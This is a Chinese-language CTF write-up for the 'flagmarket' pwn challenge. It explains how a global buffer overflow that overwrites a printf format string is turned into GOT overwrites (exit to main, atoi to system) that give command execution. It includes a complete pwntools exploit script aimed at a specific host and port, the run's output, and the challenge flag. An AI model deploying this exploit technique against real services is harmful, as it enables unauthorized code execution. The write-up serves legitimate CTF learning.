# flagmarket — Writeup

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 题目 | flagmarket |
| 分类 | Pwn（格式化字符串） |
| 目标 | `nc 49.232.142.230 15258` |
| 附件 | `bin/chall` (ELF x86-64, stripped) |
| 附件 SHA256 | `79dfafb9a138c9641fa4d1a1701c5549d6123c386b7e4991b6e230701b48c045` |
| 环境 | Ubuntu 24.04 / glibc 2.39（`ubuntu:24.04` 基础镜像，xinetd + chroot `/home/ctf`） |
| 保护 | No PIE、Partial RELRO、Canary、NX、CET(SHSTK+IBT) |
| Flag | `flag{1ec5182cef4f7590816ca6a6b45ef243}` |

## 2. Recon

```text
$ file chall
chall: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
$ checksec --file=chall
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    SHSTK:    Enabled
    IBT:      Enabled
```

关键字符串/流程（`strings` + 反汇编）：

- `/flag`（程序在 `main` 入口 `fopen("/flag","r")`，`FILE*` 存在栈上）。
- `welcome to flag market!` / `how much you want to pay?` / `Thank you for paying,let me give you flag: `。
- `something is wrong` / `opened user.log, please report:` / `user.log`。
- 交互实测：选择 `1` → 输入金额 `-1` → 程序 `fgets` 读 `/flag` 第一行并**逐字符回显直到遇到 `{`**，输出 `flag` 后进入 “report” 分支：

```text
Thank you for paying,let me give you flag: 
flag
==========error!!!==========  
Sorry, but maybe something wrong... 
you can report it in user.log
opened user.log, please report:
```

即第一行是 `flag{...}`，程序只回显 `{` 之前的部分（`flag`），隐藏前缀之后的 Flag。需要靠漏洞把 `{` 之后的内容 / 拿到 shell 重新读取。

反汇编 `main`（0x40139b）要点：

- 循环内 `read(0, buf96, 16)` → `atoi` → 判断，其中 `buf96` 位于 `rbp-96`（16 字节）。
- `/flag` 行读入 `buf80`（`rbp-80`，64 字节），逐字符 `putchar` 直到 `== '{'`。
- 命中 `{` 后（0x4015a1）：
  - `memset(0x4040c0, 0, 256)`
  - `scanf("%s", 0x4040c0)`  ← **无长度限制的全局缓冲区写入**
  - `open("user.log", ...)` / `write(fd, 0x4040c0, 256)`
- “没有付够钱”分支（金额低字节 != -1，0x4014ad）执行 `printf(0x4041c0)`，其中 `0x4041c0` 是 `.data` 里的固定字符串 `"You are so parsimonious!!!"`。

## 3. 漏洞分析

两个全局缓冲区在 `.data` 中**恰好相邻**：

```
0x4040c0  buf[256]   "everything is ok~"   <- scanf("%s", 0x4040c0) 的写入目标
0x4041c0  fmt[..]    "You are so parsimonious!!!"  <- printf(0x4041c0) 的格式串
```

`0x4041c0 - 0x4040c0 = 0x100`。向 `buf` 输入超过 256 字节即可**覆盖格式串**，而 `printf` 随后会以 `0x4041c0` 为格式串执行 —— 得到一个**格式化字符串漏洞**。

写入地址：

| 符号 | 地址 |
| --- | --- |
| `buf` | `0x4040c0` |
| 格式串 | `0x4041c0` |
| `atoi@GOT` | `0x404080` |
| `puts@GOT` | `0x404020` |
| `exit@GOT` | `0x404090` |
| `main` | `0x40139b` |

格式化字符串参数：两次 `read(0, buf96, 16)` 把用户输入放在 `rbp-96`。实测该缓冲位于 printf 的**第 12、13 号参数**：

```text
$ printf(fmt="%1$p...%30$p"), amount="BBBBBBBB"
...(nil).0x4242424242424242.0xa.(nil)...     # 0x42.. 出现在 arg#12
```

即：

- `arg#12 = qword @ buf96[0:8]`
- `arg#13 = qword @ buf96[8:16]`

于是可用 `%12$hn` / `%13$hn` 把这两 8 字节槽当作**动态目标地址**，`printf` 写到任意地址。但格式串本身在 `.bss`（不在栈上），所以“地址写在格式串尾部再 `%N$n`”的经典手法用不了；这里改用「目标地址来自可控栈参数」的方案。

### 一次格式化只能写一次，怎么多次利用？

“付够钱”分支每次只做一次 `printf(fmt)`，而 `scanf` 设置格式串的 report 路径需要 `fgets(/flag)` 再次读到含 `{` 的行 —— `/flag` 只有一行，读完即 EOF。为获得**多次设置格式串**的能力：

- 用格式串写 `exit@GOT = main`（`0x40139b` 是已知固定值，不需要 libc）。
- 之后在菜单里输入非法选项（如 `2`），`cmp al,1; jne` 会走到 `call exit`，而 `exit@GOT` 已被改成 `main` —— 程序**重新执行 main**，`fopen("/flag")` 重新打开文件。
- 于是又能 `-1` 走进 report 路径、`memset` 掉旧缓冲、`scanf` 设置**新的格式串**。如此可反复循环，等价于“可多次重设格式串”。

实测确认（选择 `2` 后菜单重新出现）：

```text
RESTART?: b' \n1.take my money\n2.exit\nwelcome to flag market!\n...'
```

## 4. 关键中间值

| 值 | 说明 |
| --- | --- |
| `0x4040c0` | `scanf("%s")` 缓冲，同时也是格式化字符串偏移 -0x100 |
| `0x4041c0` | 被覆盖的格式串地址 |
| printf arg **#12** | `buf96[0:8]`（amount 输入前 8 字节） |
| printf arg **#13** | `buf96[8:16]` |
| `exit@GOT` `0x404090` ← `main` `0x40139b` | 重启原语 |
| `atoi@GOT` `0x404080` ← `system` | 拿 shell |
| `system - atoi = 0x120f0` | 在 glibc 2.39 各 patch 版本上稳定（8 与 8.9 实测一致） |
| 实测 leak | `atoi=0x7f71c1f2a660`、`puts=0x7f71c1f6bbe0`、`puts-atoi=0x41580` |

写 2 字节：`%<n1>c%12$hn%<n2>c%13$hn` —— 先打印 `n1` 个字符，`%12$hn` 把计数 `n1` 写到 arg#12 指向的地址；再打印 `n2` 个字符，`%13$hn` 把 `n1+n2`（取低 16 位）写到 arg#13 的地址。两半按值升序排列以减小宽度。

## 5. 攻击链

```
[第一轮] -1 -> report scanf
        payload = 'A'*256 + "%64c%12$hn%4955c%13$hn"
        amount  = p64(0x404092) + p64(0x404090)
        => exit@GOT = 0x40139b (main)
        菜单输入 2 -> exit@GOT 调用 main -> main 重启(重新 fopen /flag)
                         |
[第二轮] -1 -> report scanf
        payload = 'A'*256 + "%12$s"
        amount  = p64(atoi@GOT)  -> leak atoi
        amount  = p64(puts@GOT)  -> leak puts
        system = atoi + 0x120f0
        菜单输入 2 -> main 重启
                         |
[第三轮] -1 -> report scanf
        payload = 'A'*256 + "%<L>c%12$hn%<M>c%13$hn"   (system 低 32 位, 升序)
        amount  = p64(0x404080) + p64(0x404082)
        => atoi@GOT = system   (高 32 位与 atoi 相同, 无需改)
                         |
[菜单]  send "cat /flag"
        atoi(buf96) -> system("cat /flag") -> 打印 flag
```

## 6. 完整脚本

见 `exploits/pwn/flagmarket.py`（完整内联如下）：

```python
#!/usr/bin/env python3
# flagmarket -- format-string via report-buffer overflow (+ exit@GOT=main restart)
import os
import sys

sys.path = [p for p in sys.path
            if p not in ("", ".", os.getcwd(), os.path.dirname(os.path.abspath(__file__)))]

from pwn import *

context.log_level = "info"
context.arch = "amd64"

HOST, PORT = "49.232.142.230", 15258

EXIT_GOT = 0x404090
ATOI_GOT = 0x404080
PUTS_GOT = 0x404020
MAIN = 0x40139b
SYSTEM_ATOI_DELTA = 0x120f0


def two_hn(n1, n2):
    return b"%" + str(n1).encode() + b"c%12$hn%" + str(n2).encode() + b"c%13$hn"


def write_pair(vA, tA, vB, tB):
    if vA <= vB:
        return two_hn(vA, vB - vA), p64(tA) + p64(tB)
    else:
        fmt = b"%" + str(vB).encode() + b"c%12$hn%" + str(vA - vB).encode() + b"c%13$hn"
        return fmt, p64(tB) + p64(tA)


def menu(r):
    r.recvuntil(b"choice: ")


def flagpath(r):
    r.sendline(b"1")
    r.recvuntil(b"pay?")
    r.sendline(b"-1")
    r.recvuntil(b"report:", timeout=5)


def set_fmt(r, fmt):
    r.sendline(b"A" * 256 + fmt)
    r.recvuntil(b"choice:", timeout=5)


def trigger(r, amount):
    r.sendline(b"1")
    r.recvuntil(b"pay?")
    r.send(amount if len(amount) == 16 else amount.ljust(16, b"\x00"))
    return r.recvuntil(b"welcome", timeout=5)


def restart(r):
    r.sendline(b"2")
    menu(r)


def main():
    r = remote(HOST, PORT)
    menu(r)

    # ---- Round A: exit@GOT = main ----
    flagpath(r)
    fmtA, amtA = write_pair(0x139b, EXIT_GOT, 0x0040, EXIT_GOT + 2)
    set_fmt(r, fmtA)
    trigger(r, amtA)
    restart(r)
    log.info("exit@GOT = main  (restart loop armed)")

    # ---- Round B: leak atoi & puts ----
    flagpath(r)
    set_fmt(r, b"%12$s")
    out = trigger(r, p64(ATOI_GOT))
    atoi = u64(out.split(b"\n", 1)[1][:6].ljust(8, b"\x00"))
    out = trigger(r, p64(PUTS_GOT))
    puts = u64(out.split(b"\n", 1)[1][:6].ljust(8, b"\x00"))
    system = atoi + SYSTEM_ATOI_DELTA
    log.info(f"atoi={hex(atoi)}  puts={hex(puts)}  delta={hex(puts-atoi)}")
    log.info(f"system = {hex(system)}")
    restart(r)

    # ---- Round C: atoi@GOT = system ----
    flagpath(r)
    L = system & 0xffff
    M = (system >> 16) & 0xffff
    fmtC, amtC = write_pair(L, ATOI_GOT, M, ATOI_GOT + 2)
    set_fmt(r, fmtC)
    trigger(r, amtC)
    log.info("atoi@GOT = system")

    # ---- shell ----
    menu(r)
    r.sendline(b"cat /flag")
    data = r.recvall(timeout=8)
    print(data.decode(errors="replace"))
    r.close()


if __name__ == "__main__":
    main()
```

运行：

```bash
/Users/laiandi/ctf/.venv/bin/python /Users/laiandi/ctf/exploits/pwn/flagmarket.py
```

## 7. 实际输出

```text
[+] Opening connection to 49.232.142.230 on port 15258: Done
[*] exit@GOT = main  (restart loop armed)
[*] atoi=0x7f71c1f2a660  puts=0x7f71c1f6bbe0  delta=0x41580
[*] system = 0x7f71c1f3c750
[*] atoi@GOT = system

1.take my money
2.exit
flag{1ec5182cef4f7590816ca6a6b45ef243}welcome to flag market!
give me money to buy my flag,
choice: 
1.take my money
2.exit
```

## 8. 踩坑记录

- **格式串不在栈上**：`printf` 的格式串在 `.bss`（`0x4041c0`），不能用经典“地址写在格式串尾部 + `%N$n`”。改用可控栈参数 arg#12/#13 作为目标地址。
- **只设置一次格式串不够**：report 路径靠 `fgets(/flag)` 命中 `{` 触发，而 `/flag` 只有一行，第二次 `-1` 即 EOF（`something is wrong` 后退出）。用 `exit@GOT=main` 重启 main 重新 `fopen` 来解决。
- **格式串本身不能含空白**：report 处是 `scanf("%s")`，遇到空白即停止，所以 `0x4040c0..0x4041bf` 的填充用 `'A'`，格式串不能带空格；GOT 地址字节（如 `40 40 40 00`）不含空白，可安全放在 amount 里（amount 走 `read`，不受限制）。
- **libc 版本**：远端 `puts-atoi = 0x41580`，既不是 8 也不是 8.9 的整值，说明是某个 24.04 的中间 patch 版本；但 `system - atoi = 0x120f0` 在 2.39 各 patch 中稳定，故直接用差值计算 `system`。
- **CET**：二进制带 SHSTK/IBT，直接栈溢出改返回地址可能被影子栈拦，所以走 GOT 覆写而非 ROP。

## 9. 验证

- Flag 由远端真实命令输出得到：`atoi@GOT` 被改为 `system` 后，菜单输入 `cat /flag` 由目标进程执行并打印 `flag{...}`。
- Flag 格式合法（`flag{32 位 hex}`），与题目隐藏的 `flag` 前缀一致。
- 关键原语均在独立连接上复现过：`exit@GOT=main` 重启、`%12$s` 泄漏 `atoi`/`puts`、双 `%hn` 写 2 字节。
